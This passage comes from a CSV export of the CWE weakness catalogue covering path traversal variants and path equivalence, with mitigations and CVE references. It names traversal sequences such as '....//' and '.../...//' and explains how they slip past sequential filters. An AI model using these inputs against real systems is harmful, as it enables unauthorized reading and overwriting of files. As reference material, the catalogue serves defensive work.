commands:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0491::REFERENCE:CVE-2001-0615:DESCRIPTION:... or .... in chat server:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0615::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:'....' (multiple dot)::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"::TYPE:Maintenance:NOTE:Like the triple-dot CWE-32, this manipulation probably hides multiple weaknesses that should be made more explicit.::\","
  },
  "doc-3bc32240e5240d24f6f51965ec40a518": {
    "content": "CWE-ID,Name,Weakness Abstraction,Status,Description,Extended Description,Related Weaknesses,Weakness Ordinalities,Applicable Platforms,Background Details,Alternate Terms,Modes Of Introduction,Exploitation Factors,Likelihood of Exploit,Common Consequences,Detection Methods,Potential Mitigations,Observed Examples,Functional Areas,Affected Resources,Taxonomy Mappings,Related Attack Patterns,Notes\n34,\"Path Traversal: '....//'\",Variant,Incomplete,\"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '....//' (doubled dot dot slash) sequences that can resolve to a location that is outside of that directory.\",\"This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory. The '....//' manipulation is useful for bypassing some path traversal protection schemes. If ../ is filtered in a sequential fashion, as done by some regular expression engines, then ....// can collapse into the ../ unsafe value (CWE-182). It could also be useful when .. is removed, if the operating system treats // and / as equivalent.\",::NATURE:ChildOf:CWE ID:23:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:SOAR Partial::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.) Formal Methods / Correct-By-Construction:EFFECTIVENESS:High::\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single . character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as / to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434. Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering / is insufficient protection if the filesystem also supports the use of as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ../ sequences are removed from the .../...// string in a sequential fashion, two instances of ../ would be removed from the original string, but the remaining characters would still form the ../ string.:EFFECTIVENESS:High::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2004-1670:DESCRIPTION:Mail server allows remote attackers to create arbitrary directories via a .. or rename arbitrary files via a ....// in user supplied parameters.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1670::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:'....//' (doubled dot dot slash)::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"::TYPE:Relationship:NOTE:This could occur due to a cleansing error that removes a single ../ from ....//::\",\n35,\"Path Traversal: '.../...//'\",Variant,Incomplete,\"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '.../...//' (doubled triple dot slash) sequences that can resolve to a location that is outside of that directory.\",\"This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory. The '.../...//' manipulation is useful for bypassing some path traversal protection schemes. If ../ is filtered in a sequential fashion, as done by some regular expression engines, then .../...// can collapse into the ../ unsafe value (CWE-182). Removing the first ../ yields ....//; the second removal yields ../. Depending on the algorithm, the product could be susceptible to CWE-34 but not CWE-35, or vice versa.\",::NATURE:ChildOf:CWE ID:23:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single . character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as / to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434. Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering / is insufficient protection if the filesystem also supports the use of as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ../ sequences are removed from the .../...// string in a sequential fashion, two instances of ../ would be removed from the original string, but the remaining characters would still form the ../ string.:EFFECTIVENESS:High::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2005-2169:DESCRIPTION:chain: .../...// bypasses protection mechanism using regexp's that remove ../ resulting in collapse into an unsafe value ../ (CWE-182) and resultant path traversal.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2169::REFERENCE:CVE-2005-0202:DESCRIPTION:.../..../// bypasses regexp's that remove ./ and ../:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0202::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:'.../...//'::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"\",\n36,\"Absolute Path Traversal\",Base,Draft,\"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize absolute path sequences such as /abs/path that can resolve to a location that is outside of that directory.\",\"This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.\",::NATURE:ChildOf:CWE ID:22:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:22:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:22:VIEW ID:1340:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands:NOTE:The attacker may be able to create or overwrite critical files that are used to execute code, such as programs or libraries.::SCOPE:Integrity:IMPACT:Modify Files or Directories:NOTE:The attacker may be able to overwrite or create critical files, such as programs, libraries, or important data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, appending a new account at the end of a password file may allow an attacker to bypass authentication.::SCOPE:Confidentiality:IMPACT:Read Files or Directories:NOTE:The attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, by reading a password file, the attacker could conduct brute force password guessing attacks in order to break into an account on the system.::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:NOTE:The attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the product from working at all and in the case of a protection mechanisms such as authentication, it has the potential to lockout every user of the product.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"\",\"::REFERENCE:CVE-2022-31503:DESCRIPTION:Python package constructs filenames using an unsafe os.path.join call on untrusted input, allowing absolute path traversal because os.path.join resets the pathname to an absolute path that is specified as part of the input.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-31503::REFERENCE:CVE-2002-1345:DESCRIPTION:Multiple FTP clients write arbitrary files via absolute paths in server responses:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1345::REFERENCE:CVE-2001-1269:DESCRIPTION:ZIP file extractor allows full path:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1269::REFERENCE:CVE-2002-1818:DESCRIPTION:Path traversal using absolute pathname:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1818::REFERENCE:CVE-2002-1913:DESCRIPTION:Path traversal using absolute pathname:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1913::REFERENCE:CVE-2005-2147:DESCRIPTION:Path traversal using absolute pathname:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2147::REFERENCE:CVE-2000-0614:DESCRIPTION:Arbitrary files may be overwritten via compressed attachments that specify absolute path names for the decompressed output.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0614::REFERENCE:CVE-1999-1263:DESCRIPTION:Mail client allows remote attackers to overwrite arbitrary files via an e-mail message containing a uuencoded attachment that specifies the full pathname for the file to be modified.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-1263::REFERENCE:CVE-2003-0753:DESCRIPTION:Remote attackers can read arbitrary files via a full pathname to the target file in config parameter.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0753::REFERENCE:CVE-2002-1525:DESCRIPTION:Remote attackers can read arbitrary files via an absolute pathname.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1525::REFERENCE:CVE-2001-0038:DESCRIPTION:Remote attackers can read arbitrary files by specifying the drive letter in the requested URL.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0038::REFERENCE:CVE-2001-0255:DESCRIPTION:FTP server allows remote attackers to list arbitrary directories by using the ls command and including the drive letter name (e.g. C:) in the requested pathname.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0255::REFERENCE:CVE-2001-0933:DESCRIPTION:FTP server allows remote attackers to list the contents of arbitrary drives via a ls command that includes the drive letter as an argument.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0933::REFERENCE:CVE-2002-0466:DESCRIPTION:Server allows remote attackers to browse arbitrary directories via a full pathname in the arguments to certain dynamic pages.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0466::REFERENCE:CVE-2002-1483:DESCRIPTION:Remote attackers can read arbitrary files via an HTTP request whose argument is a filename of the form C: (Drive letter), //absolute/path, or .. .:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1483::REFERENCE:CVE-2004-2488:DESCRIPTION:FTP server read/access arbitrary files using C: filenames:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2488::REFERENCE:CVE-2001-0687:DESCRIPTION:FTP server allows a remote attacker to retrieve privileged web server system information by specifying arbitrary paths in the UNC format (computernamesharename).:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0687::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Absolute Path Traversal::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",::597::,\"\",\n37,\"Path Traversal: '/absolute/pathname/here'\",Variant,Draft,\"The product accepts input in the form of a slash absolute path ('/absolute/pathname/here') without appropriate validation, which can allow an attacker to traverse the file system to unintended locations or access arbitrary files.\",\"\",::NATURE:ChildOf:CWE ID:36:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:160:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single . character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as / to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434. Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering / is insufficient protection if the filesystem also supports the use of as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ../ sequences are removed from the .../...// string in a sequential fashion, two instances of ../ would be removed from the original string, but the remaining characters would still form the ../ string.:EFFECTIVENESS:High::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2002-1345:DESCRIPTION:Multiple FTP clients write arbitrary files via absolute paths in server responses:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1345::REFERENCE:CVE-2001-1269:DESCRIPTION:ZIP file extractor allows full path:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1269::REFERENCE:CVE-2002-1818:DESCRIPTION:Path traversal using absolute pathname:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1818::REFERENCE:CVE-2002-1913:DESCRIPTION:Path traversal using absolute pathname:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1913::REFERENCE:CVE-2005-2147:DESCRIPTION:Path traversal using absolute pathname:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2147::REFERENCE:CVE-2000-0614:DESCRIPTION:Arbitrary files may be overwritten via compressed attachments that specify absolute path names for the decompressed output.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0614::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:/absolute/pathname/here::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO05-C:ENTRY NAME:Identify files using multiple file attributes::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"\",\n38,\"Path Traversal: 'absolutepathnamehere'\",Variant,Draft,\"The product accepts input in the form of a backslash absolute path ('absolutepathnamehere') without appropriate validation, which can allow an attacker to traverse the file system to unintended locations or access arbitrary files.\",\"\",::NATURE:ChildOf:CWE ID:36:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single . character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as / to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434. Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering / is insufficient protection if the filesystem also supports the use of as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ../ sequences are removed from the .../...// string in a sequential fashion, two instances of ../ would be removed from the original string, but the remaining characters would still form the ../ string.:EFFECTIVENESS:High::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-1999-1263:DESCRIPTION:Mail client allows remote attackers to overwrite arbitrary files via an e-mail message containing a uuencoded attachment that specifies the full pathname for the file to be modified.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-1263::REFERENCE:CVE-2003-0753:DESCRIPTION:Remote attackers can read arbitrary files via a full pathname to the target file in config parameter.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0753::REFERENCE:CVE-2002-1525:DESCRIPTION:Remote attackers can read arbitrary files via an absolute pathname.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1525::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:absolutepathnamehere ('backslash absolute path')::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO05-C:ENTRY NAME:Identify files using multiple file attributes::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"\",\n39,\"Path Traversal: 'C:dirname'\",Variant,Draft,\"The product accepts input that contains a drive letter or Windows volume letter ('C:dirname') that potentially redirects access to an unintended location or arbitrary file.\",\"\",::NATURE:ChildOf:CWE ID:36:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands:NOTE:The attacker may be able to create or overwrite critical files that are used to execute code, such as programs or libraries.::SCOPE:Integrity:IMPACT:Modify Files or Directories:NOTE:The attacker may be able to overwrite or create critical files, such as programs, libraries, or important data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, appending a new account at the end of a password file may allow an attacker to bypass authentication.::SCOPE:Confidentiality:IMPACT:Read Files or Directories:NOTE:The attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, by reading a password file, the attacker could conduct brute force password guessing attacks in order to break into an account on the system.::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:NOTE:The attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the software from working at all and in the case of a protection mechanisms such as authentication, it has the potential to lockout every user of the software.::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single . character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as / to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434. Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering / is insufficient protection if the filesystem also supports the use of as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ../ sequences are removed from the .../...// string in a sequential fashion, two instances of ../ would be removed from the original string, but the remaining characters would still form the ../ string.:EFFECTIVENESS:High::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2001-0038:DESCRIPTION:Remote attackers can read arbitrary files by specifying the drive letter in the requested URL.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0038::REFERENCE:CVE-2001-0255:DESCRIPTION:FTP server allows remote attackers to list arbitrary directories by using the ls command and including the drive letter name (e.g. C:) in the requested pathname.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0255::REFERENCE:CVE-2001-0687:DESCRIPTION:FTP server allows a remote attacker to retrieve privileged system information by specifying arbitrary paths.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0687::REFERENCE:CVE-2001-0933:DESCRIPTION:FTP server allows remote attackers to list the contents of arbitrary drives via a ls command that includes the drive letter as an argument.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0933::REFERENCE:CVE-2002-0466:DESCRIPTION:Server allows remote attackers to browse arbitrary directories via a full pathname in the arguments to certain dynamic pages.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0466::REFERENCE:CVE-2002-1483:DESCRIPTION:Remote attackers can read arbitrary files via an HTTP request whose argument is a filename of the form C: (Drive letter), //absolute/path, or .. .:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1483::REFERENCE:CVE-2004-2488:DESCRIPTION:FTP server read/access arbitrary files using C: filenames:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2488::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:'C:dirname' or C: (Windows volume or 'drive letter')::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO05-C:ENTRY NAME:Identify files using multiple file attributes::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"\",\n41,\"Improper Resolution of Path Equivalence\",Base,Incomplete,\"The product is vulnerable to file system contents disclosure through path equivalence. Path equivalence involves the use of special characters in file and directory names. The associated manipulations are intended to generate multiple names for the same object.\",\"Path equivalence is usually employed in order to circumvent access controls expressed using an incomplete set of file name or file path representations. This is different from path traversal, wherein the manipulations are performed to generate a name for a different object.\",::NATURE:ChildOf:CWE ID:706:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Access Control:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories:IMPACT:Bypass Protection Mechanism:NOTE:An attacker may be able to traverse the file system to unintended locations and read or overwrite the contents of unexpected files. If the files are used for a security mechanism than an attacker may be able to bypass the mechanism.::\",\"::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Bytecode Weakness Analysis - including disassembler + source code weakness analysis:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Automated Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Web Application Scanner Web Services Scanner Database Scanners:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Fuzz Tester Framework-based Fuzzer:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Focused Manual Spotcheck - Focused manual analysis of source Manual Source Code Review (not inspections):EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:SOAR Partial::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Formal Methods / Correct-By-Construction Cost effective for partial coverage: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2000-1114:DESCRIPTION:Source code disclosure using trailing dot:LINK:https://www.cve.org/CVERecord?id=CVE-2000-1114::REFERENCE:CVE-2002-1986:DESCRIPTION:Source code disclosure using trailing dot:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1986::REFERENCE:CVE-2004-2213:DESCRIPTION:Source code disclosure using trailing dot or trailing encoding space %20:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2213::REFERENCE:CVE-2005-3293:DESCRIPTION:Source code disclosure using trailing dot:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3293::REFERENCE:CVE-2004-0061:DESCRIPTION:Bypass directory access restrictions using trailing dot in URL:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0061::REFERENCE:CVE-2000-1133:DESCRIPTION:Bypass directory access restrictions using trailing dot in URL:LINK:https://www.cve.org/CVERecord?id=CVE-2000-1133::REFERENCE:CVE-2001-1386:DESCRIPTION:Bypass check for .lnk extension using .lnk.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1386::REFERENCE:CVE-2001-0693:DESCRIPTION:Source disclosure via trailing encoded space %20:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0693::REFERENCE:CVE-2001-0778:DESCRIPTION:Source disclosure via trailing encoded space %20:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0778::REFERENCE:CVE-2001-1248:DESCRIPTION:Source disclosure via trailing encoded space %20:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1248::REFERENCE:CVE-2004-0280:DESCRIPTION:Source disclosure via trailing encoded space %20:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0280::REFERENCE:CVE-2005-0622:DESCRIPTION:Source disclosure via trailing encoded space %20:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0622::REFERENCE:CVE-2005-1656:DESCRIPTION:Source disclosure via trailing encoded space %20:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1656::REFERENCE:CVE-2002-1603:DESCRIPTION:Source disclosure via trailing encoded space 